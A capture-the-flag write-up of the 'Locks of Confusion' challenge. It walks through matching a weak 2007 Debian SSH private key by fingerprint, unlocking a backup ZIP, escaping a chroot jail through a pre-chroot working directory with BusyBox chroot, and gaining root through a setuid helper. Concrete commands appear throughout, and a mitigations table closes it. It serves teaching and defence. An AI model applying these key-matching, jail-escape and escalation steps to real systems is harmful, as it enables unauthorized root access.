---
link: 'writeups/kpmg-ctf-2026/locks-of-confusion'
title: "Locks of Confusion - KPMG CTF 2026"
description: "Writeup for Locks of Confusion (Parts 1 & 2) from KPMG CTF 2026. Recovering a weak 2007-era SSH private key from a legacy system archive, then escaping a chroot jail via a misplaced working directory and a setuid helper binary."
date: 2026-10-25 11:52:00
categories:
  - [Writeups, KPMG CTF 2026]
tags:
  - KPMG-CTF-2026
  - Infrastructure
  - SSH
  - Weak Keys
  - Chroot Escape
  - Privilege Escalation
---

# KPMG CTF 2026 — Locks of Confusion

---

## Challenge Description

> An Internal Ops portal surfaces inventory, tickets, DNS, and documentation for a fleet of servers. One of them is a Debian 4.0 legacy database replica from 2007 whose SSH keypair was never rotated. Find the key, unlock the backup, and escalate to root.

**Flags:** Two — account-data backup (user) and root shell.

---

## Step 1 — Reconnaissance

The Internal Ops dashboard linked to several useful pages:

| Endpoint | What it revealed |
|---|---|
| `/inventory` | `legacy-03` — Debian 4.0 (Etch), deployed 2007-11-14, running OpenSSL `0.9.8c-4` and OpenSSH `4.3p2-9` |
| `/tickets` | Ticket `TICK-4471` — SSH access issue for `svc-legacydb` after 2011 P2V migration |
| `/wiki/notes` | Confirmed SSH host keys and the `svc-legacydb` keypair were generated in 2007 and carried over without regeneration |

Ticket `TICK-4471`'s HTML source contained two hidden archive paths in comments:

```plain
/archive/provisioning/legacy-03-2007.tar.gz
/archive/keyspace/legacy-keys-2007.tar.gz
```

![Archive paths discovered in ticket HTML](/img/posts/kpmg-ctf-2026-12_loc_archive_paths.webp)

Requests to those paths redirected to `/verify` — a node-selection image challenge. Completing it in the browser unlocked the downloads for that session.

---

## Step 2 — Extracting the Archives

```bash
# After passing the /verify image challenge in-browser:
wget --load-cookies cookies.txt \
  http://<host>/archive/provisioning/legacy-03-2007.tar.gz \
  http://<host>/archive/keyspace/legacy-keys-2007.tar.gz

tar -xzf legacy-03-2007.tar.gz
tar -xzf legacy-keys-2007.tar.gz
```

**Provisioning archive contents:**

```plain
legacy-03-2007/
  home/svc-legacydb/.ssh/authorized_keys   ← the deployed public key
  var/log/provision.log                     ← confirms unencrypted 2048-bit RSA key, generated 2007
  etc/ssh/sshd_config.fragment
  etc/motd
  README-RESTORE.txt
```

**Keyspace archive:** 300 candidate PEM private keys (`privkey_0000.pem` …… `privkey_0299.pem`).

![Finding the private key match](/img/posts/kpmg-ctf-2026-11_loc_found_privkey.webp)

The `README.txt` inside the keyspace archive (note from M. Reyes, infra) also pointed to a password-protected backup ZIP:

```plain
/archive/backups/e6f25638ae2ed6ba955cdae6a74c6798.zip
```

![Key and path information from README](/img/posts/kpmg-ctf-2026-13_loc_keys_path.webp)

---

## Step 3 — Finding the Matching Private Key

I fingerprinted the `authorized_keys` entry and compared it against every candidate:

```bash
target=$(ssh-keygen -lf legacy-03-2007/home/svc-legacydb/.ssh/authorized_keys | awk '{print $2}')

for key in legacy-keys-2007/privkey_*.pem; do
  fp=$(ssh-keygen -y -P '' -f "$key" 2>/dev/null | ssh-keygen -lf - 2>/dev/null | awk '{print $2}')
  [ "$fp" = "$target" ] && echo "MATCH: $key"
done
```

**Result:** `privkey_0137.pem`

> [!NOTE]
> The 2007 OpenSSL version (`0.9.8c`) was affected by the Debian weak-key vulnerability (CVE-2008-0166), which drastically reduced the RSA keyspace — this is why only 300 candidates were needed.

---

## Step 4 — Unlocking the Backup ZIP (Part 1 Flag)

Per the README, the ZIP password is the **first 64 characters of the base64 body** of the matching PEM (headers, footers, and line breaks stripped):

```bash
password=$(grep -v '^-----' legacy-keys-2007/privkey_0137.pem | tr -d '\n' | cut -c1-64)
unzip -P "$password" e6f25638ae2ed6ba955cdae6a74c6798.zip
```

![ZIP password derivation](/img/posts/kpmg-ctf-2026-14_loc_zip_password.webp)

The ZIP contained `user.txt` with the first flag.

![Part 1 flag](/img/posts/kpmg-ctf-2026-10_loc_flag_part1.webp)

### Flag 1

```text
KPMG_CTF{QkZ-FGqQZ9zMq1Z_jJ3RiuNp8ZfyNJebZTZ_U385U7UP}
```

---

## Step 5 — SSH Login to the Live Host (Part 2)

**Target:** `nc 0.cloud.chals.io 26107`

Using `privkey_0137.pem` to authenticate as `svc-legacydb`:

```sh
ssh -tt -p 26107 \
  -i /path/to/privkey_0137.pem \
  -o IdentitiesOnly=yes \
  svc-legacydb@0.cloud.chals.io
```

The login succeeded but dropped into a restricted **BusyBox shell**. The `PATH` was `/nonexistent`, so standard commands weren't found. BusyBox itself was reachable at its full path:

```sh
/bin/busybox id    # uid=1500
/bin/busybox ls
```

The shell also printed `sh: getcwd: No such file or directory` — a strong hint that the working directory was **outside the visible filesystem**.

![SSH config observed](/img/posts/kpmg-ctf-2026-15_loc2_ssh_config.webp)

---

## Step 6 — Mapping the Jail

The `jail_shell` binary (inspected via SFTP) performed this sequence on login:

```text
chdir("/opt/diagnostics/landing")   ← moves CWD outside the future jail
chroot("/opt/jail")                 ← jails the filesystem root
drop to UID/GID 1500
exec /bin/sh
```

Because the shell changed directory **before** the `chroot`, the working directory still pointed to a real path on the host filesystem — outside `/opt/jail`. The shell could not resolve it, producing the `getcwd` error, but relative paths like `../../../` still traversed the host filesystem.

```sh
/bin/busybox ls ..
/bin/busybox ls ../..
/bin/busybox ls ../../..   # shows real container root: etc, home, opt, root, usr
```

> [!IMPORTANT]
> Running `cd /` at this point would move the shell into the jail and lose the outside-jail working directory. All traversal must happen before any `cd /`.

---

## Step 7 — SFTP Recon and Setuid Binary

I used SFTP on the same port to inspect the real filesystem:

```sh
sftp -P 26107 \
  -i /path/to/privkey_0137.pem \
  -o IdentitiesOnly=yes \
  svc-legacydb@0.cloud.chals.io
```

```text
sftp> ls -la /usr/local/bin
```

Two SUID binaries appeared:

| Binary | Owner | Permissions | Purpose |
|---|---|---|---|
| `jail_shell` | root | `-rws--x--x` | Sets up the chroot jail on login |
| `diag-recovery` | root | `-rws--x--x` | Calls `setgid(0)`, `setuid(0)`, then `/bin/sh` |

`diag-recovery` was a **root shell launcher** — setuid root with no further checks.

![SSH allows password auth](/img/posts/kpmg-ctf-2026-16_loc2_ssh_allows_password.webp)
![Passwd folder recon](/img/posts/kpmg-ctf-2026-17_loc2_passwd_folder.webp)

---

## Step 8 — Chroot Escape and Root Shell

From a **fresh SSH login** (before any `cd`), the working directory was still outside the jail. BusyBox retained `CAP_SYS_CHROOT`, so it could call `chroot` again:

```sh
/bin/busybox chroot ../../../ /bin/sh
```

`../../../` resolved to the container's real root. This new shell was **unjailed** while still running as `svc-legacydb`. From there, running the setuid helper:

```sh
/usr/local/bin/diag-recovery
/bin/id
```

```text
uid=0(root) gid=0(root) groups=0(root),1000(svc-legacydb)
```

Reading the root flag:

```sh
/bin/cat /root/root.txt
```

### Flag 2 (Root)

```text
KPMG_CTF{71INJZCHUi1zpL1dggZenlcyMHs6qh-NtW7ntKiKLBpo}
```

---

## Mitigations

| Vulnerability | Recommended Fix |
|---|---|
| Unrotated 2007 SSH keys (Debian weak-key bug) | Regenerate all keypairs; enforce key rotation policy |
| Archive paths exposed in HTML comments | Purge debug/staging comments before production deployment |
| Chroot escape via pre-chroot `chdir` | Use `pivot_root` or namespaces instead of `chroot` for sandboxing |
| Unrestricted SUID root helper (`diag-recovery`) | Remove or replace with a capability-based alternative; audit all SUID binaries |
| BusyBox retaining `CAP_SYS_CHROOT` | Drop all unnecessary capabilities before dropping privileges |

---

## Summary

Locks of Confusion chained two phases across a legacy infrastructure story. Part 1 exploited the historically weak Debian OpenSSL RNG (CVE-2008-0166) — the 2007-era SSH keypair had an astronomically reduced keyspace, making brute-force fingerprint matching feasible across 300 candidates. Part 2 used the classic `chdir`-before-`chroot` escape: the login shell placed the working directory outside the jail, and BusyBox's retained `CAP_SYS_CHROOT` allowed a second `chroot` call to escape back to the real filesystem, after which a root-owned SUID helper finished the escalation.
